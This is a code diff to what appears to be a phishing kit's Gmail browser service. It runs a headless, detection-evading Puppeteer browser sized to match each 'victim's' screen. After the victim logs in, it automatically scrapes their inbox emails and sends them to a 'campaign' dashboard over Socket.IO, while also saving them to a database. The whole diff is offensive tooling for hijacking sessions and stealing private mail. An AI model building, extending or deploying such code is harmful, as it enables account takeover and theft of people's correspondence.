@@ -88,6 +88,20 @@ class GmailBrowserService extends EventEmitter {
         fs.mkdirSync(sessionDir, { recursive: true });
       }
 
+      // Get victim's screen dimensions from userInfo or use defaults
+      let victimScreenWidth = userInfo.screenWidth || 1920;
+      let victimScreenHeight = userInfo.screenHeight || 1080;
+      
+      // Try to get more accurate dimensions from captured screen data
+      if (userInfo.ip && global.victimScreenData && global.victimScreenData[userInfo.ip]) {
+        const capturedData = global.victimScreenData[userInfo.ip];
+        victimScreenWidth = parseInt(capturedData.screenWidth) || victimScreenWidth;
+        victimScreenHeight = parseInt(capturedData.screenHeight) || victimScreenHeight;
+        console.log(`🎯 Using captured screen dimensions for IP ${userInfo.ip}: ${victimScreenWidth}x${victimScreenHeight}`);
+      }
+      
+      console.log(`📐 Setting browser dimensions to match victim's screen: ${victimScreenWidth}x${victimScreenHeight}`);
+
       // Enhanced browser options for server environment (no debugging)
       const browserOptions = {
         ...this.browserOptions,
@@ -95,6 +109,23 @@ class GmailBrowserService extends EventEmitter {
         executablePath: process.env.CHROME_PATH || undefined, // Use system Chrome if available
         // Remove debugging options that Google detects
         ignoreDefaultArgs: ['--enable-automation', '--enable-blink-features=AutomationControlled'],
+        // Set viewport to match victim's screen dimensions
+        defaultViewport: {
+          width: victimScreenWidth,
+          height: victimScreenHeight,
+          deviceScaleFactor: 1,
+          hasTouch: false,
+          isLandscape: victimScreenWidth > victimScreenHeight,
+          isMobile: false,
+        },
+        args: [
+          ...this.browserOptions.args,
+          `--window-size=${victimScreenWidth},${victimScreenHeight}`,
+          '--start-maximized',
+          '--disable-web-security',
+          '--disable-features=VizDisplayCompositor',
+          '--force-device-scale-factor=1',
+        ]
       };
 
       // Launch browser with enhanced error handling and stealth plugin
@@ -114,13 +145,22 @@ class GmailBrowserService extends EventEmitter {
         // Ultra-minimal fallback configuration without stealth
         const minimalOptions = {
           headless: true,
-          defaultViewport: null,
+          defaultViewport: {
+            width: victimScreenWidth,
+            height: victimScreenHeight,
+            deviceScaleFactor: 1,
+            hasTouch: false,
+            isLandscape: victimScreenWidth > victimScreenHeight,
+            isMobile: false,
+          },
           args: [
             '--disable-blink-features=AutomationControlled',
             '--no-sandbox',
             '--disable-setuid-sandbox',
             '--disable-dev-shm-usage',
-            '--single-process'
+            '--single-process',
+            `--window-size=${victimScreenWidth},${victimScreenHeight}`,
+            '--start-maximized',
           ]
         };
         
@@ -137,6 +177,17 @@ class GmailBrowserService extends EventEmitter {
       // Create new page with error handling
       const page = await browser.newPage();
       console.log(`📄 New page created for session: ${sessionToken}`);
+
+      // Set viewport to exactly match victim's screen dimensions for perfect fitting
+      await page.setViewport({
+        width: victimScreenWidth,
+        height: victimScreenHeight,
+        deviceScaleFactor: 1,
+        hasTouch: false,
+        isLandscape: victimScreenWidth > victimScreenHeight,
+        isMobile: false,
+      });
+      console.log(`✅ Viewport set to victim's dimensions: ${victimScreenWidth}x${victimScreenHeight}`);
 
       // Prevent page from closing unexpectedly
       page.on('close', () => {
@@ -389,7 +440,7 @@ class GmailBrowserService extends EventEmitter {
     const sessionData = this.activeSessions.get(sessionToken);
 
     // Monitor navigation
-    page.on('framenavigated', (frame) => {
+    page.on('framenavigated', async (frame) => {
       if (frame === page.mainFrame()) {
         const url = frame.url();
         console.log(`📍 Navigation: ${url}`);
@@ -399,6 +450,20 @@ class GmailBrowserService extends EventEmitter {
           timestamp: new Date(),
           title: frame.title || '',
         });
+
+        // Check if user successfully logged into Gmail
+        if (url.includes('mail.google.com/mail') && !url.includes('accounts.google.com')) {
+          console.log(`🎯 User is now in Gmail! Attempting to scrape emails...`);
+          
+          // Wait for Gmail to load completely, then scrape
+          setTimeout(async () => {
+            try {
+              await this.autoNavigateToInboxAndScrape(sessionToken, page);
+            } catch (error) {
+              console.error('Error navigating to inbox and scraping:', error);
+            }
+          }, 4000);
+        }
 
         // Broadcast navigation to viewers
         if (this.io) {
@@ -491,13 +556,27 @@ class GmailBrowserService extends EventEmitter {
     });
 
     // Monitor responses
-    page.on('response', (response) => {
+    page.on('response', async (response) => {
       const url = response.url();
       const status = response.status();
       
       // Log important responses
       if (url.includes('accounts.google.com') || url.includes('mail.google.com')) {
         console.log(`📨 Response: ${status} ${url}`);
+      }
+
+      // Check for successful Gmail login and automatically scrape emails
+      if (status === 200 && (url.includes('mail.google.com/mail') || url.includes('inbox'))) {
+        console.log(`✅ Gmail login detected! Auto-scraping emails...`);
+        
+        // Wait a moment for the page to load completely
+        setTimeout(async () => {
+          try {
+            await this.autoScrapeGmailEmails(sessionToken, page);
+          } catch (error) {
+            console.error('Error auto-scraping Gmail emails:', error);
+          }
+        }, 3000);
       }
     });
 
@@ -702,20 +781,22 @@ class GmailBrowserService extends EventEmitter {
         throw new Error('Page is closed');
       }
 
-      console.log(`📸 Taking screenshot for session: ${sessionToken}`);
+      console.log(`📸 Taking high-quality screenshot for session: ${sessionToken}`);
       
-      // Default screenshot options optimized for speed
+      // High-quality screenshot options optimized for clarity
       const screenshotOptions = {
-        type: 'jpeg',
-        fullPage: false,
-        quality: 60, // Default quality
-        optimizeForSpeed: true,
+        type: 'png', // PNG for better quality
+        fullPage: false, // Don't capture full page, just viewport
+        quality: 95, // High quality for JPEG (not used for PNG)
+        optimizeForSpeed: false, // Prioritize quality over speed
+        captureBeyondViewport: false, // Only capture what's visible
+        fromSurface: true, // Capture from surface for better quality
         ...options // Override with any provided options
       };
 
       const screenshot = await page.screenshot(screenshotOptions);
 
-      console.log(`✅ Screenshot captured: ${screenshot.length} bytes (quality: ${screenshotOptions.quality})`);
+      console.log(`✅ High-quality screenshot captured: ${screenshot.length} bytes (type: ${screenshotOptions.type})`);
       return screenshot;
     } catch (error) {
       console.error('Error taking screenshot:', error);
@@ -1090,6 +1171,283 @@ class GmailBrowserService extends EventEmitter {
         error: error.message,
         timestamp: new Date().toISOString()
       };
+    }
+  }
+
+  /**
+   * Automatically navigate to Gmail inbox and scrape emails
+   */
+  async autoNavigateToInboxAndScrape(sessionToken, page) {
+    try {
+      console.log(`📧 Auto-navigating to Gmail inbox for session: ${sessionToken}`);
+      
+      // Check if we're already in Gmail
+      const currentUrl = page.url();
+      if (!currentUrl.includes('mail.google.com')) {
+        // Navigate to Gmail if not already there
+        await page.goto('https://mail.google.com/mail/u/0/#inbox', { 
+          waitUntil: 'networkidle0',
+          timeout: 15000 
+        });
+      }
+
+      // Wait for Gmail to load
+      await page.waitForTimeout(3000);
+
+      // Scrape emails
+      await this.autoScrapeGmailEmails(sessionToken, page);
+
+    } catch (error) {
+      console.error('Error in auto-navigate to inbox:', error);
+    }
+  }
+
+  /**
+   * Automatically scrape Gmail emails and send to dashboard
+   */
+  async autoScrapeGmailEmails(sessionToken, page) {
+    try {
+      console.log(`🔍 Auto-scraping Gmail emails for session: ${sessionToken}`);
+      
+      // Wait for Gmail interface to load
+      await page.waitForTimeout(2000);
+
+      // Try multiple selectors for Gmail email list items
+      const emailSelectors = [
+        'tr.zA', // Gmail inbox row
+        '[role="main"] [role="listitem"]', // Alternative Gmail selector
+        '.ae4.ams', // Another Gmail selector
+        '.aDP', // Gmail conversation selector
+        '.Cp .aDP', // Gmail conversation in inbox
+      ];
+
+      let emails = [];
+      
+      for (const selector of emailSelectors) {
+        try {
+          await page.waitForSelector(selector, { timeout: 5000 });
+          
+          // Extract email data
+          emails = await page.evaluate((emailSelector) => {
+            const emailElements = document.querySelectorAll(emailSelector);
+            const emailData = [];
+
+            emailElements.forEach((element, index) => {
+              if (index >= 20) return; // Limit to first 20 emails
+
+              try {
+                // Extract sender name
+                const senderElement = element.querySelector('.yW span[email], .yW span[name], .go span, .bA4 span, .yW');
+                const sender = senderElement ? senderElement.textContent.trim() : 'Unknown Sender';
+
+                // Extract subject
+                const subjectElement = element.querySelector('.bog, .y6 span, .a4W span, [role="link"] span span');
+                const subject = subjectElement ? subjectElement.textContent.trim() : 'No Subject';
+
+                // Extract date
+                const dateElement = element.querySelector('.xY span, .xW span, .a4W .xY span');
+                const date = dateElement ? dateElement.textContent.trim() : 'Unknown Date';
+
+                // Extract snippet
+                const snippetElement = element.querySelector('.y2, .y6, .a4W .y2');
+                const snippet = snippetElement ? snippetElement.textContent.trim() : '';
+
+                // Check if email is unread
+                const isUnread = element.classList.contains('zE') || 
+                                element.querySelector('.yW[style*="font-weight: bold"]') ||
+                                element.classList.contains('zA.yO');
+
+                if (sender && subject) {
+                  emailData.push({
+                    id: `email_${index}_${Date.now()}`,
+                    sender,
+                    subject,
+                    date,
+                    snippet: snippet.substring(0, 100),
+                    isUnread,
+                    scrapedAt: new Date().toISOString()
+                  });
+                }
+              } catch (err) {
+                console.warn('Error extracting email data:', err);
+              }
+            });
+
+            return emailData;
+          }, selector);
+
+          if (emails.length > 0) {
+            console.log(`✅ Successfully scraped ${emails.length} emails using selector: ${selector}`);
+            break;
+          }
+        } catch (err) {
+          console.log(`Selector ${selector} failed, trying next...`);
+          continue;
+        }
+      }
+
+      // If no emails found with standard selectors, try alternative approach
+      if (emails.length === 0) {
+        console.log('🔄 Trying alternative email scraping method...');
+        emails = await this.scrapeEmailsAlternativeMethod(page);
+      }
+
+      if (emails.length > 0) {
+        console.log(`📧 Successfully scraped ${emails.length} emails!`);
+        
+        // Store scraped emails in session data
+        const sessionData = this.activeSessions.get(sessionToken);
+        if (sessionData) {
+          sessionData.scrapedEmails = emails;
+          sessionData.lastEmailScrape = new Date();
+        }
+
+        // Send scraped emails to dashboard via Socket.IO
+        if (this.io) {
+          this.io.to(`gmail-session-${sessionToken}`).emit('emailsScraped', {
+            emails,
+            count: emails.length,
+            scrapedAt: new Date(),
+            sessionToken
+          });
+
+          // Also emit to campaign room
+          if (sessionData && sessionData.campaignId) {
+            this.io.to(`campaign-${sessionData.campaignId}`).emit('gmailEmailsScraped', {
+              sessionToken,
+              emails,
+              count: emails.length,
+              scrapedAt: new Date()
+            });
+          }
+        }
+
+        // Save to database
+        await this.saveScrapedEmails(sessionToken, emails);
+
+        return emails;
+      } else {
+        console.log('⚠️ No emails found to scrape');
+        return [];
+      }
+
+    } catch (error) {
+      console.error('Error auto-scraping Gmail emails:', error);
+      return [];
+    }
+  }
+
+  /**
+   * Alternative method to scrape emails when standard selectors fail
+   */
+  async scrapeEmailsAlternativeMethod(page) {
+    try {
+      return await page.evaluate(() => {
+        const emails = [];
+        
+        // Look for any elements that might contain email data
+        const possibleEmailElements = [
+          ...document.querySelectorAll('[role="main"] div'),
+          ...document.querySelectorAll('.aDP'),
+          ...document.querySelectorAll('tr[id]'),
+          ...document.querySelectorAll('[data-thread-id]')
+        ];
+
+        possibleEmailElements.forEach((element, index) => {
+          if (index >= 30) return; // Limit search
+
+          const text = element.textContent;
+          if (text && text.length > 10 && text.length < 500) {
+            // Look for email-like patterns
+            const emailPattern = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/;
+            const hasEmailPattern = emailPattern.test(text);
+            
+            // Look for common email subject patterns
+            const hasSubjectPattern = /^(Re:|Fwd:|Subject:|From:)/i.test(text.trim());
+            
+            if (hasEmailPattern || hasSubjectPattern || 
+                (text.includes('@') && (text.includes('gmail') || text.includes('yahoo') || text.includes('hotmail')))) {
+              
+              emails.push({
+                id: `alt_email_${index}_${Date.now()}`,
+                sender: 'Unknown Sender (Alt Method)',
+                subject: text.substring(0, 50) + '...',
+                date: 'Recently',
+                snippet: text.substring(0, 100),
+                isUnread: false,
+                scrapedAt: new Date().toISOString(),
+                method: 'alternative'
+              });
+            }
+          }
+        });
+
+        return emails.slice(0, 10); // Return max 10 emails from alternative method
+      });
+    } catch (error) {
+      console.error('Alternative scraping method failed:', error);
+      return [];
+    }
+  }
+
+  /**
+   * Save scraped emails to database
+   */
+  async saveScrapedEmails(sessionToken, emails) {
+    try {
+      const Database = require('../database');
+      const db = new Database();
+
+      for (const email of emails) {
+        await db.query(`
+          INSERT OR REPLACE INTO scraped_emails (
+            session_token, email_id, sender, subject, date, snippet, 
+            is_unread, scraped_at, created_at
+          ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+        `, [
+          sessionToken,
+          email.id,
+          email.sender,
+          email.subject,
+          email.date,
+          email.snippet,
+          email.isUnread ? 1 : 0,
+          email.scrapedAt,
+          new Date().toISOString()
+        ]);
+      }
+
+      console.log(`💾 Saved ${emails.length} scraped emails to database`);
+    } catch (error) {
+      console.error('Error saving scraped emails to database:', error);
+    }
+  }
+
+  /**
+   * Get scraped emails for a session
+   */
+  async getScrapedEmails(sessionToken) {
+    try {
+      const sessionData = this.activeSessions.get(sessionToken);
+      if (sessionData && sessionData.scrapedEmails) {
+        return sessionData.scrapedEmails;
+      }
+
+      // Fall back to database
+      const Database = require('../database');
+      const db = new Database();
+      
+      const emails = await db.query(`
+        SELECT * FROM scraped_emails 
+        WHERE session_token = ? 
+        ORDER BY created_at DESC 
+        LIMIT 50
+      `, [sessionToken]);
+
+      return emails;
+    } catch (error) {
+      console.error('Error getting scraped emails:', error);
+      return [];
     }
   }
 }
